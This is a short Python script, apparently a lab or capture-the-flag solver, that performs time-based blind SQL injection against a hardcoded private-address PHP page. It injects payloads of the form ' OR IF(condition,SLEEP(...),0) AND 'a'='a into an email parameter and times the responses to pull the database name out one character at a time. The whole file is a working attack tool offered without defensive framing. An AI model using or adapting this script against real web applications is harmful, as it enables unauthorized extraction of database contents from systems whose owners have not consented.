#!/usr/bin/env python3

import requests
from urllib.parse import quote_plus
from time import time
from itertools import chain


class Blind():
	def __init__(self, url='http://10.102.10.42/regards.php?email=',
				 delay=0.1):
		self.url = url
		self.delay = delay

	def send(self, payload, method='GET'):
		payload = quote_plus(payload)
		start = time()
		if method == 'GET':
			r = requests.get(self.url + payload)
		elif method == 'POST':
			r = requests.post(self.url, data=payload)

		end = time()
		if end - start >= self.delay:
			return True
		else:
			return False

	def make_payload(self, cond):
		query = "' OR IF(" + cond + ",SLEEP(" + str(self.delay) + \
				"),0) AND 'a'='a"
		return query

	def get_length(self, item):
		condition = 'LENGTH(' + item + ')={}'
		r = False
		i = 0

		while not r:
			i += 1
			payload = self.make_payload(condition.format(i))
			r = self.send(payload)

		return i

	def get_string(self, item, length=None):
		if not length:
			length = self.get_length(item)

		condition = "SUBSTRING(" + item + ",{},1)='{}'"
		string = ''

		for i in range(1, length + 1):
			r = False
			for j in range(92, 123):
				payload = self.make_payload(condition.format(i, chr(j)))
				r = self.send(payload)
				if r:
					break

			string += chr(j)

		return string


if __name__ == '__main__':
	b = Blind()

	print(b.get_string('DATABASE()'))
